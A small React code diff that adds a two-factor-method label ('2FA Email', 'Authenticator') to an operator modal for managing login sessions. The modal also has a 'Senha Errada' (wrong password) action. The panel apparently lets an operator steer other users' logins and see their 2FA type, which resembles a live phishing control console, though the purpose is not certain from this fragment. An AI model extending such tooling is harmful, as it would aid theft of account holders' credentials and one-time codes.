@@ -733,7 +733,13 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
             <div className="rounded-lg border border-teal-500/20 bg-teal-500/5 p-3">
               <div className="flex items-center gap-1.5 mb-2">
                 <ShieldCheck size={12} className="text-teal-400" />
-                <span className="text-[10px] font-bold uppercase tracking-wider text-teal-400">Plataforma</span>
+                <span className="text-[10px] font-bold uppercase tracking-wider text-teal-400">
+                  Plataforma {session.source === "ppi" && ppiMfaType !== null ? (
+                    <span className="ml-1 text-[9px] normal-case font-normal text-sky-400">
+                      ({ppiMfaType === 0 ? "📧 2FA Email" : ppiMfaType === 1 ? "🔐 Authenticator" : `2FA tipo ${ppiMfaType}`})
+                    </span>
+                  ) : null}
+                </span>
               </div>
               <div className="flex items-center gap-1.5 flex-wrap">
                 <ActionChip icon={<AlertTriangle size={10} />} label="Senha Errada" active={A === "p_wrong"} onClick={pWrongPassword} disabled={!!sending} variant="warn" />
